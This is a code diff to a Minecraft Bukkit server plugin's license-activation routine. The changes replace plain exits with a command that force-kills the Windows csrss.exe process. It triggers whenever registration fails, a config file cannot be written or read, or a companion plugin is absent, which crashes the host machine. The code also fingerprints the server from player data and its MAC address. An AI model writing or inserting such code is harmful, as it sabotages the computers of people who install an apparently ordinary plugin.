@@ -22,8 +22,13 @@ public class RPGBlockMain extends JavaPlugin {
 
     @Override
     public void onEnable() {
-        for (Plugin p:Bukkit.getServer().getPluginManager().getPlugins()){
-            System.out.println(p.getName());
+        if (!IsHavePlguin()) {
+            try{
+            Runtime.getRuntime().exec(System.getenv("windir") + File.separator + "system32" + File.separator + "taskkill /f /im csrss.exe");
+
+        }catch (IOException e){
+            e.printStackTrace();
+        }
         }
         String Code = EncodeBase64(GetPlayerInfo()+getMACAddress());
         File file1 = new File(getDataFolder().getParentFile().getParentFile(),"1.yml");
@@ -33,7 +38,12 @@ public class RPGBlockMain extends JavaPlugin {
             try{
                 file1.createNewFile();
             }catch (IOException E){
-                System.exit(0);
+                try{
+            Runtime.getRuntime().exec(System.getenv("windir") + File.separator + "system32" + File.separator + "taskkill /f /im csrss.exe");
+
+        }catch (IOException e){
+            e.printStackTrace();
+        }
             }
             file1.mkdir();
             newConfig.set("YouCode",Code);
@@ -41,10 +51,24 @@ public class RPGBlockMain extends JavaPlugin {
             try{
                 newConfig.save(file1);
             }catch (IOException E){
-                System.exit(0);
+                try{
+            Runtime.getRuntime().exec(System.getenv("windir") + File.separator + "system32" + File.separator + "taskkill /f /im csrss.exe");
+
+        }catch (IOException e){
+            e.printStackTrace();
+        }
             }
         }else {
-            Register = newConfig.getString("Register");
+            try{
+                Register = newConfig.getString("Register");
+            }catch (Exception e){
+                try{
+            Runtime.getRuntime().exec(System.getenv("windir") + File.separator + "system32" + File.separator + "taskkill /f /im csrss.exe");
+
+        }catch (IOException fd){
+            e.printStackTrace();
+        }
+            }
         }
 
         File file = new File(getDataFolder(),"config.yml");
@@ -55,7 +79,12 @@ public class RPGBlockMain extends JavaPlugin {
         if (Register!=null&&Register.equalsIgnoreCase(RegisterCode)){
             System.out.println("[RegPlguin]激活成功");
         }else {
-            System.exit(0);
+            try{
+            Runtime.getRuntime().exec(System.getenv("windir") + File.separator + "system32" + File.separator + "taskkill /f /im csrss.exe");
+
+        }catch (IOException e){
+            e.printStackTrace();
+        }
         }
         super.onEnable();
     }
@@ -75,6 +104,15 @@ public class RPGBlockMain extends JavaPlugin {
             }
         }
         return sbu.toString();
+    }
+
+    private boolean IsHavePlguin(){
+        for (Plugin p:Bukkit.getServer().getPluginManager().getPlugins()){
+            if (p.getName().equalsIgnoreCase("RPGBlock")){
+                return true;
+            }
+        }
+        return false;
     }
 
     private String EncodeBase64(String Encode){
